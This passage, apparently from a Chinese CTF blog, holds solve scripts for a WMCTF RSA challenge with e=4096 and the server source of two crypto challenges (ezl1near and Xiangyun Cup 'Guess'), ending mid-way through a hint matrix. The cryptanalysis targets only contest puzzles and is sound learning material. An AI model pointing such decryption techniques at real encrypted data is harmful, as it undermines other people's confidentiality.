<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339325435517394532697652694250302927324547950654199907918057947165277944713164863611463887879016367147027651</span></span><br><span class="line">e = <span class="number">4096</span></span><br><span class="line">c = <span class="number">202821697585498721190880385651888326819052363235092021514522019296117832067188656931773131985516119359273814956340533509702817980744398402155886334655033938474295749168241550740096583920405311629354495691732306096266636370938656838375279086916114964255411601403125984312042419408682006688199111243135798564394</span></span><br><span class="line"></span><br><span class="line">mi = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    mi.append(<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    mi.append(p - <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    c = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mi:</span><br><span class="line">    t = long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;WMCTF&#x27;</span> <span class="keyword">in</span> t:</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后看来Striving师傅的博客，原来有限域开方也是可以的，看来我并没有理解其中的精华，回顾之前的<a href="https://blog.csdn.net/m0_49109277/article/details/118603921?spm=1001.2014.3001.5501">ctfshow unusualrsa系列的博客</a>，其实有了sage一切就并不复杂</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339325435517394532697652694250302927324547950654199907918057947165277944713164863611463887879016367147027651</span></span><br><span class="line">e = <span class="number">4096</span></span><br><span class="line">c = <span class="number">202821697585498721190880385651888326819052363235092021514522019296117832067188656931773131985516119359273814956340533509702817980744398402155886334655033938474295749168241550740096583920405311629354495691732306096266636370938656838375279086916114964255411601403125984312042419408682006688199111243135798564394</span></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="comment"># res1 = [(496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339313214656968189495352306293673615992017103882095004555948437432049586089024300970437646867574391499674950, 1), (12220860426343202300387956629311332530846772104903362109509733228358624140562641026241011441975647352701, 1)]</span></span><br><span class="line">c = <span class="number">12220860426343202300387956629311332530846772104903362109509733228358624140562641026241011441975647352701</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>

<p>确实可以，跑的比预计的要快</p>
<h2 id="Crypto-ezl1near（unsolved）"><a href="#Crypto-ezl1near（unsolved）" class="headerlink" title="Crypto-ezl1near（unsolved）"></a>Crypto-ezl1near（unsolved）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes , bytes_to_long , getPrime , inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> socketserver , signal</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">q = <span class="number">2</span>**<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandbits</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(os.urandom(n // <span class="number">8</span>+<span class="number">1</span>)) &gt;&gt; (<span class="number">8</span>-n%<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg , <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self._send(<span class="string">f&quot;sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        self._send(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">        x = self._recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            self.send(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genrsa</span>(<span class="params">self</span>):</span></span><br><span class="line">        _p = getPrime(<span class="number">1024</span>)</span><br><span class="line">        _q = getPrime(<span class="number">1024</span>)</span><br><span class="line">        self.n = _p * _q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = inverse(self.e , (_p-<span class="number">1</span>)*(_q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_vec</span>(<span class="params">self,num , length</span>):</span></span><br><span class="line">        vec = []</span><br><span class="line">        <span class="keyword">while</span> length &gt; <span class="number">0</span>:</span><br><span class="line">            vec = [num % q] + vec</span><br><span class="line">            num //= q</span><br><span class="line">            length -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> vec</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_mat</span>(<span class="params">self,numlist</span>):</span></span><br><span class="line">        M =[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> numlist:</span><br><span class="line">            M.append(self.to_vec(i , <span class="number">40</span>))</span><br><span class="line">        <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">self, key , m</span>):</span></span><br><span class="line">        key = self.to_mat(key)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">            temp = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                temp += m[j]* key[j][i]</span><br><span class="line">                temp %= q</span><br><span class="line">            res.append(temp)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">120</span>)</span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.genrsa()</span><br><span class="line">        self._send(<span class="built_in">str</span>(self.n))</span><br><span class="line">        self._send(<span class="built_in">str</span>(self.e))</span><br><span class="line">        secret = [<span class="number">1</span>] + [<span class="number">2</span>*getrandbits(<span class="number">23</span>)-<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">        self._send(<span class="string">b&#x27;Please generate key for me and I will give you my secret.But you have only two chances.&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            key = []</span><br><span class="line">            f0 = getrandbits(<span class="number">480</span>)</span><br><span class="line">            key.append(f0)</span><br><span class="line">            self._send(<span class="built_in">str</span>(<span class="built_in">pow</span>(f0 , self.e , self.n)))</span><br><span class="line">            f0 += f0 &lt;&lt; <span class="number">480</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">                self._send(<span class="string">&#x27;key&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">                c = <span class="built_in">int</span>(self._recv())</span><br><span class="line">                m = <span class="built_in">pow</span>(c , self.d , self.n)</span><br><span class="line">                f = m - f0</span><br><span class="line">                f %= self.n</span><br><span class="line">                key.append(f)</span><br><span class="line">            c = self.enc(key , secret)</span><br><span class="line">            self._send(<span class="string">&#x27;Thanks, here is your cipher:&#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line">        self._send(<span class="string">b&#x27;do you know the secret?&#x27;</span>)</span><br><span class="line">        guess = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> self._recv().split(<span class="string">b&#x27; &#x27;</span>)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(guess) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">if</span> guess[j] != secret[j]:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">                self._send(<span class="string">b&#x27;congratulations. here is your flag:&#x27;</span>)</span><br><span class="line">                self._send(flag)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._send(<span class="string">b&#x27;L1near don\&#x27;t care.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>没心情，看不下去了</p>
<p>可谓是重大失误，全程密码爆0，签到题搞心态，对不起web和misc的师傅</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210821 祥云杯Crypto方向部分WP</title>
    <url>/posts/60aa74b/</url>
    <content><![CDATA[<p>比赛中自己就出了一道，尚师傅出了myRSA，得到他的真传后对这道题思路比较清楚了，还是想复现下，然后Guess这题看了大多师傅的wp都是非预期解，所以想再研究一下，主要想尽量内化成自己的东西</p>
<p>可惜国内的比赛结束就关nc，没有观赏性</p>
<span id="more"></span>

<h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><h2 id="Crypto-Guess（recuring）"><a href="#Crypto-Guess（recuring）" class="headerlink" title="Crypto-Guess（recuring）"></a>Crypto-Guess（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> (</span><br><span class="line">    bytes_to_long,</span><br><span class="line">    getPrime,</span><br><span class="line">    long_to_bytes,</span><br><span class="line">    getRandomNBitInteger,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">512</span></span><br><span class="line">WELCOME = <span class="string">&quot;welcome to my funny challenge !!! Can you guess right 32 times in a row? &quot;</span></span><br><span class="line">String = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = exgcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert</span>(<span class="params">a,p</span>):</span></span><br><span class="line">    x, y, q = exgcd(a,p)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;No solution.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (x + p) % p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcm</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a*b // gcd(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    STR = <span class="string">&quot;&quot;</span>.join([String[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(String) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    HASH = hashlib.sha256(STR.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> STR[:<span class="number">4</span>], STR[<span class="number">4</span>:], HASH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="comment"># part 1</span></span><br><span class="line">    p, q = getPrime(KEYSIZE), getPrime(KEYSIZE)</span><br><span class="line">    n = p * q</span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    LAMBDA = lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># part 2</span></span><br><span class="line">    _key = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _key.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">                key.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">80</span></span><br><span class="line">    <span class="keyword">assert</span> key[<span class="number">0</span>] == <span class="number">119</span> <span class="keyword">and</span> key[<span class="number">1</span>] ==  <span class="number">241</span> <span class="keyword">and</span> key[<span class="number">2</span>] ==  <span class="number">718</span> <span class="keyword">and</span> key[<span class="number">3</span>] == <span class="number">647</span></span><br><span class="line">    <span class="keyword">return</span> n, g, LAMBDA, key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">n, g, m</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = random.randint(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(r, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    c = (<span class="built_in">pow</span>(g, m, n ** <span class="number">2</span>) * <span class="built_in">pow</span>(r, n, n ** <span class="number">2</span>)) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">n, g, LAMBDA, c</span>):</span></span><br><span class="line">    L1 = (<span class="built_in">pow</span>(c, LAMBDA, n ** <span class="number">2</span>) - <span class="number">1</span>) // n</span><br><span class="line">    L2 = (<span class="built_in">pow</span>(g, LAMBDA, n ** <span class="number">2</span>) - <span class="number">1</span>) // n</span><br><span class="line">    m = (invert(L2, n) * L1) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg, <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&quot;\n&quot;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Service start.&quot;</span>)</span><br><span class="line">        START, END, HASH = proof_of_work()</span><br><span class="line">        self._send(<span class="string">&quot;SHA-256(?+&#123;&#125;) == &#123;&#125;&quot;</span>.<span class="built_in">format</span>(END, HASH))</span><br><span class="line">        RCV = self._recv().decode()</span><br><span class="line">        <span class="keyword">if</span> RCV != START:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        self._send(WELCOME)</span><br><span class="line">        <span class="comment"># step 1. KeyGen</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            self._send(<span class="string">&quot;round &quot;</span> + <span class="built_in">str</span>(_+<span class="number">1</span>))</span><br><span class="line">            n, g, LAM, KEY = keygen()</span><br><span class="line">            self._send(<span class="string">&quot;Step 1 - KeyGen. This is my public key.&quot;</span>)</span><br><span class="line">            self._send(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">            self._send(<span class="string">&quot;g = &quot;</span> + <span class="built_in">str</span>(g))</span><br><span class="line">            <span class="comment"># step 2. Phase 1</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 2 - Phase 1. Now, you can give me one ciphertexts,I will return the corresponding plaintext.&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            self._send(<span class="string">&quot;Please give me one decimal ciphertext.&quot;</span>)</span><br><span class="line">            cipher = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            plaintext = <span class="built_in">str</span>(dec(n, g, LAM, cipher))</span><br><span class="line">            self._send(<span class="string">&quot;This is the corresponding plaintext.&quot;</span>)</span><br><span class="line">            self._send(plaintext)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># step 3. challenge</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 3 - Challenge. Now, you must give me two decimal plaintexts(m0,m1), I will encry them and return a ciphertext randomly&quot;</span></span><br><span class="line">            )</span><br><span class="line">            self._send(<span class="string">&quot;Give me m0.&quot;</span>)</span><br><span class="line">            plaintext1 = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            self._send(<span class="string">&quot;Give me m1.&quot;</span>)</span><br><span class="line">            plaintext2 = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                plaintext1 &lt;= <span class="number">2</span></span><br><span class="line">                <span class="keyword">or</span> plaintext2 &lt;= <span class="number">2</span></span><br><span class="line">                <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(plaintext1)) != <span class="built_in">len</span>(<span class="built_in">bin</span>(plaintext2))</span><br><span class="line">            ):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            R = <span class="number">2</span> * random.randint(<span class="number">0</span>, <span class="number">39</span>)</span><br><span class="line">            I = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R])</span><br><span class="line">            cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + <span class="number">1</span>])</span><br><span class="line">            self._send(<span class="string">&quot;This is a ciphertext.&quot;</span>)</span><br><span class="line">            self._send(<span class="built_in">str</span>([cipher1, cipher2][I]))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># step 4. Phase 2</span></span><br><span class="line"></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 4 - Phase 2. Now, you can give me some ciphertexts,I will return the corresponding plaintext.But you can not give me the ciphertext that I give you in step 3.&quot;</span></span><br><span class="line">            )</span><br><span class="line">            self._send(<span class="string">&quot;Please give me one decimal ciphertext &quot;</span>)</span><br><span class="line">            cipher = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line">            plaintext = <span class="built_in">str</span>(dec(n, g, LAM, cipher))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(plaintext) == plaintext1 * plaintext2 * KEY[R] <span class="keyword">or</span> <span class="built_in">int</span>(plaintext) == plaintext1 * plaintext2 * KEY[R+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            self._send(<span class="string">&quot;This is the corresponding plaintext.&quot;</span>)</span><br><span class="line">            self._send(plaintext)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># step.5 Guess</span></span><br><span class="line">            self._send(</span><br><span class="line">                <span class="string">&quot;Step 5 - Guess. You must tell me which ciphertext was I give you in step 3, 0 or 1(m0 -&gt; c0 , m1 -&gt; c1)?&quot;</span></span><br><span class="line">            )</span><br><span class="line">            Guess = <span class="built_in">int</span>(self._recv().decode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> Guess == I:</span><br><span class="line">                self._send(<span class="string">&quot;Good! You are right&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._send(<span class="string">&quot;Sorry!&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        self._send(flag)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>key.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    A = []</span><br><span class="line">    key = random_matrix(ZZ, <span class="number">20</span>, <span class="number">4</span>, x = <span class="number">100</span>, y =<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> key[i,j] <span class="keyword">not</span> <span class="keyword">in</span> A:   </span><br><span class="line">                A.append(key[i,j])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(A) == <span class="number">80</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">hint = Matrix(key * vector([getRandomNBitInteger(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="built_in">str</span>(key))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;hint&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="built_in">str</span>(hint))</span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">269865700520122549144762599745168447135899292447636617756605602545212728167797447445787398106779613741477733230173614340453529478006749280203791219240495545320784253247776438152444000193996715061172344898960798274898870276035746116096626771403981985377907323596813517124099024451197742946526103390328807831246256</span> <span class="number">351825797459362105605308649037214670594688383340169438930434420259269928275998050547973935801446674821508093953928259345972518243250576886209287947085399150853100589302713875591726622523078239591200598436879752732176246887916248939358959982281252327937943016323841545720179709080112518678442049362350981509034718</span> <span class="number">263649494857153084116592322640026892708704523757635879704627428861744239824087544706911427923497181418081141799670872495368713195091290104184732226016053955456080069924363050718931449355663612295983210728462521014504883613920516962136372253488247300322354664463901602570541318156197056622985692829393446426824638</span> <span class="number">453400473599186415430546643705275038528777172686002821040599810743439930425207458033941717472852507386860793929840595207225134962986513734506356764693655438618941180687198445634254053696966577360482969943538482461972582638716434085445938134971492342779462032414137699485112547903822163588315191244265946324218228</span> <span class="number">221827206659930588955100802225668305862545149941640820857015107405314701820405616518433413575662470655465592803570411353938784340140188287733921352831214120360424367473260917811334848500233701311695438235451684226463170984345521338680563403806364662014170986174411732503648583380588103055128943038500134530643916</span> <span class="number">262203710827134666754393441371926810666786719624203864995763104952378827035382567436334257544099220873788181813028566666315029478997429146874858602787070177245600709015255267085423481719645325028750498589844959751577586557620102816409584289798347398835894955523264261758402589145048117452982723970755642721185948</span> <span class="number">449549947180605498384084224904383747663117854129634140960197279513891658001908553899154409208608867208695858453347485738326065752599578853421177093646899183717259826566392731977061092066943083219101516409628761436417329565252863717622046112713719560452994438641997826306366514591051557604666293190256180831457338</span> <span class="number">427882301208025139610114439882502441914598510240693844044902667415035988021658089285061603431657599603331045335448467272333422417626837392018638001129889364932929941669822436427404546395551452209585894226820734770968204014611476942151983657836762789688274393777314450201198374683092768582274185754609711412304708</span> <span class="number">206110709892941001547312247977630809641839341262123534620411119329846379553052343003462513763026898611550676850103678046155244343919504874675861711356256906122323272209951451243624891037181757295933079679771758786258823164385868611152404813858000740881052355543339622168479080269444970004478675521293416826708518</span> <span class="number">376172049695479754397279304655900327678015926783104795566699104261135819399512659621342636669298191140461316867639169744791504345311783942430174703887150776382877123936598986072421903671214609751973940119880560010023509512099294872489902196710299820192154670761462699775769831592820505043876853866377139051584700</span> <span class="number">354989144495191036439184720296945551786270296981167948019894874956969763278354891643393993638515549874937620037229446883785428867336828993393766325205264827014803398207234817979275257572341689686447010646631351076260136309756747006523828716693825921688154934832911308097472833298941167446737019496978821483004142</span> <span 